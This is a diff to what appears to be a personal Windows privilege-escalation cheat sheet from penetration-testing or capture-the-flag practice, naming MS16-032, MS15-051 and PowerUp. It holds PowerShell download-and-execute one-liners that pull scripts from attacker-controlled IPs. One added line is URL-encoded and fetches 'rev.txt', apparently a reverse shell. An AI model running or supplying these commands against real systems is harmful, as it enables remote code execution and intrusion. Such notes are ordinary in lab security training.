@@ -76,10 +76,13 @@ sherlock --> find vulns
 MS16-032 --> empire --> https://github.com/EmpireProject/Empire.git --> empire/data/module_source/privesc/Invoke-MS16032.ps1 !!! BE SURE TO RUN IN X64
 powerup --> empire echo IEX(New-Object Net.WebClient).downloadString('http://10.10.14.12/PowerUp.ps1') | powershell -noprofile -
   Either append Invoke-Allchecks at the bottom or after execution type Invoke-AllChecks
+  or cat powerup.ps1 | grep functions
+    Get-RegistryAutoLogon
 MS15-051 --> https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-051
 [environment]::is64bitoperatingsystem
 [environment]::is64bitprocess
-
+#If problems occure with privesc check proccess architecture and run powershell 64bit
+cmd%20/c%20c:\Windows\SysNative\WindowsPowershell\v1.0\powershell%20IEX(New-Object%20Net.WebClient).downloadString(%27http://10.10.14.73/rev.txt%27)
 
 
 #create credentials object
